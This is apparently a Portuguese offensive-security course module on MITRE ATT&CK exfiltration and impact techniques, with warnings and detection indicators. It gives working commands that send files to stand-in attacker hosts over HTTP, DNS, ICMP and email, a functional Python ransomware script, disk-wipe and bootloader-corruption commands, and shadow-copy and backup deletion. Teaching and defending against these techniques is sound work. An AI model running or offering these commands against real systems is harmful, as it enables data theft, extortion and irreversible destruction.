# 13 - Exfiltração e Impacto

**MITRE ATT&CK Tactics:** 
- [TA0010 - Exfiltration](https://attack.mitre.org/tactics/TA0010/)
- [TA0040 - Impact](https://attack.mitre.org/tactics/TA0040/)

## 📖 Sobre

**Exfiltração:** Técnicas para **roubar dados** da rede vítima.  
**Impacto:** Técnicas para **interromper, degradar ou destruir** sistemas e dados.

## 🎯 Objetivos

- **Exfiltração:** Extrair dados coletados sem ser detectado
- **Impacto:** Causar dano aos sistemas, dados ou operações (ransomware, wiper, DoS)

---

## 📚 EXFILTRAÇÃO - Técnicas Principais

### T1020 - Automated Exfiltration
- Exfiltração automatizada
- Scripts de exfiltração

### T1030 - Data Transfer Size Limits
- Quebrar dados em chunks
- Evitar detecção de transferências grandes

### T1048 - Exfiltration Over Alternative Protocol
- **T1048.001** - Exfiltration Over Symmetric Encrypted Non-C2 Protocol
- **T1048.002** - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- **T1048.003** - Exfiltration Over Unencrypted Non-C2 Protocol
- DNS, ICMP, FTP

### T1041 - Exfiltration Over C2 Channel
- Usar canal C2 existente
- HTTP/HTTPS C2

### T1011 - Exfiltration Over Other Network Medium
- WiFi, Bluetooth
- Redes alternativas

### T1052 - Exfiltration Over Physical Medium
- **T1052.001** - Exfiltration over USB
- USB, External HDD
- Air-gap bypass

### T1567 - Exfiltration Over Web Service
- **T1567.001** - Exfiltration to Code Repository (GitHub, GitLab)
- **T1567.002** - Exfiltration to Cloud Storage (Dropbox, Google Drive, OneDrive)
- Usar serviços legítimos

### T1029 - Scheduled Transfer
- Transferências agendadas
- Períodos de baixo tráfego

### T1537 - Transfer Data to Cloud Account
- Upload para cloud
- Abuse de contas cloud

---

## 📚 IMPACTO - Técnicas Principais

### T1531 - Account Access Removal
- Bloquear contas legítimas
- Trocar senhas

### T1485 - Data Destruction
- Deletar dados
- Wiper malware

### T1486 - Data Encrypted for Impact
- **Ransomware**
- Criptografar dados da vítima

### T1565 - Data Manipulation
- **T1565.001** - Stored Data Manipulation
- **T1565.002** - Transmitted Data Manipulation
- **T1565.003** - Runtime Data Manipulation
- Modificar dados para causar dano

### T1491 - Defacement
- **T1491.001** - Internal Defacement
- **T1491.002** - External Defacement
- Desfiguração de websites

### T1561 - Disk Wipe
- **T1561.001** - Disk Content Wipe
- **T1561.002** - Disk Structure Wipe
- Destruir dados do disco

### T1499 - Endpoint Denial of Service
- DoS local
- Resource exhaustion

### T1495 - Firmware Corruption
- Corromper firmware/BIOS
- Brick devices

### T1490 - Inhibit System Recovery
- Deletar backups
- Desabilitar recuperação do sistema

### T1498 - Network Denial of Service
- **T1498.001** - Direct Network Flood
- **T1498.002** - Reflection Amplification
- DDoS attacks

### T1489 - Service Stop
- Parar serviços críticos
- Desabilitar AV, backup

### T1529 - System Shutdown/Reboot
- Desligar/reiniciar sistemas
- Interromper operações

---

## 🛠️ Técnicas de Exfiltração

### HTTP/HTTPS Exfiltration
```bash
# cURL upload
curl -X POST -F "file=@sensitive.zip" https://attacker.com/upload

# Python HTTP upload
python3 -m http.server 8000  # Attacker
wget --post-file=data.zip http://attacker:8000  # Target

# PowerShell upload
Invoke-RestMethod -Uri "http://attacker.com/upload" -Method Post -InFile "C:\data.zip"
```

### DNS Exfiltration
```bash
# Encode data in DNS queries
# data.txt -> base64 -> split -> DNS queries
cat data.txt | base64 | while read line; do
    dig $line.attacker.com
done

# dnscat2 tunnel
dnscat2 --dns domain=attacker.com
```

### ICMP Exfiltration
```bash
# Encode data in ICMP packets
# icmptunnel, ptunnel
sudo ptunnel -p attacker_ip -lp 8000 -da target_ip -dp 22
```

### Cloud Storage Exfiltration
```bash
# AWS S3
aws s3 cp sensitive.zip s3://exfil-bucket/

# Google Drive (rclone)
rclone copy sensitive.zip gdrive:/exfil/

# Dropbox
curl -X POST https://content.dropboxapi.com/2/files/upload \
    --header "Authorization: Bearer <TOKEN>" \
    --header "Content-Type: application/octet-stream" \
    --data-binary @sensitive.zip
```

### Steganography
```python
# Hide data in image
from PIL import Image
import numpy as np

# Load image and data
img = Image.open('cover.png')
data = open('secret.txt', 'rb').read()

# Hide data in LSB
pixels = np.array(img)
# Modify LSB...
img.save('stego.png')
```

### Email Exfiltration
```python
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

msg = MIMEMultipart()
msg['From'] = 'victim@company.com'
msg['To'] = 'attacker@evil.com'
msg['Subject'] = 'Report'

# Attach file
with open('data.zip', 'rb') as f:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(f.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment', filename='data.zip')
    msg.attach(part)

# Send
server = smtplib.SMTP('smtp.company.com', 587)
server.send_message(msg)
```

---

## 🛠️ Técnicas de Impacto

### Ransomware Básico
```python
# APENAS PARA EDUCAÇÃO - NUNCA USAR EM AMBIENTE REAL
from cryptography.fernet import Fernet
import os

# Generate key
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt files
for root, dirs, files in os.walk('/path/to/encrypt'):
    for file in files:
        filepath = os.path.join(root, file)
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(filepath + '.encrypted', 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)

# Save key (in real ransomware, send to C2)
with open('key.key', 'wb') as f:
    f.write(key)
```

### Data Wiper
```bash
# Linux - Wipe disk
dd if=/dev/zero of=/dev/sda bs=1M

# Secure delete files
shred -vfz -n 10 sensitive.txt

# Windows - Delete files
del /f /s /q C:\data\*
cipher /w:C:\data  # Wipe free space
```

### Backup Deletion
```powershell
# Windows - Delete shadow copies
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Delete Windows backup catalog
wbadmin delete catalog -quiet

# Disable System Restore
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
```

### Service Disruption
```powershell
# Windows - Stop services
Stop-Service -Name "ServiceName" -Force
sc stop ServiceName
sc config ServiceName start= disabled

# Linux - Stop services
systemctl stop servicename
systemctl disable servicename
service servicename stop
```

### Defacement
```bash
# Web defacement
echo "<h1>Hacked!</h1>" > /var/www/html/index.html

# Replace all files in web directory
find /var/www/html -type f -exec cp defacement.html {} \;
```

### System Corruption
```bash
# Corrupt bootloader (Linux)
dd if=/dev/zero of=/dev/sda bs=446 count=1

# Delete critical system files (MUITO PERIGOSO)
rm -rf /boot/*
rm -rf /etc/*
```

---

## 🎓 Labs Práticos

### Exfiltration
- [ ] HTTP POST exfiltration
- [ ] DNS exfiltration com dnscat2
- [ ] Cloud storage upload (S3, Drive)
- [ ] Steganography básica
- [ ] ICMP tunneling

### Impact
- [ ] Ransomware simulation (ambiente isolado!)
- [ ] Backup deletion simulation
- [ ] Service stop/disable
- [ ] File wiper (ambiente controlado!)

## 🛠️ Ferramentas

### Exfiltration
- **dnscat2** - DNS tunnel
- **iodine** - DNS tunnel
- **rclone** - Cloud sync
- **Invoke-WebRequest** - PowerShell HTTP
- **Steghide** - Steganography

### Impact (Educational Only!)
- **Metasploit** - exploit/windows/fileformat/malicious_*
- **Custom scripts** - Educational ransomware
- **LOIC/HOIC** - DoS tools (NUNCA use sem autorização!)

## 🔍 Detecção

### Exfiltration Indicators
- Large outbound transfers
- DNS queries anormais (muitos, longos)
- Uploads para cloud storage
- Conexões para IPs/domínios suspeitos
- High entropy data em protocolos não-criptografados
- Off-hours data transfers

### Impact Indicators
- Mass file encryption
- Shadow copy deletion
- Backup deletion
- Service stops em massa
- Unusual disk activity
- Ransom notes
- System crashes

### Monitoramento
- **DLP (Data Loss Prevention)**
- **Network monitoring** - NetFlow, SIEM
- **EDR** - Endpoint Detection & Response
- **File Integrity Monitoring**
- **Backup monitoring**

---

## ⚠️ AVISO CRÍTICO

**IMPACTO É DESTRUTIVO E ILEGAL SEM AUTORIZAÇÃO!**

- ❌ **NUNCA** execute ransomware, wipers ou DoS em sistemas reais
- ❌ **NUNCA** delete backups de produção
- ❌ **NUNCA** corrompa dados de terceiros
- ✅ **SEMPRE** use VMs isoladas para testes
- ✅ **SEMPRE** tenha autorização por escrito
- ✅ **SEMPRE** mantenha backups antes de testar

**Uso não autorizado é CRIME com penas severas!**

---

## 📚 Recursos

- [MITRE ATT&CK - Exfiltration](https://attack.mitre.org/tactics/TA0010/)
- [MITRE ATT&CK - Impact](https://attack.mitre.org/tactics/TA0040/)
- [HackTricks - Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration)
- [No More Ransom Project](https://www.nomoreransom.org/)
- [Ransomware Decryptors](https://www.nomoreransom.org/en/decryption-tools.html)

---

**Anterior:** [12-ComandoControle](../12-ComandoControle/) | **Próximo:** [14-Forense](../14-Forense/)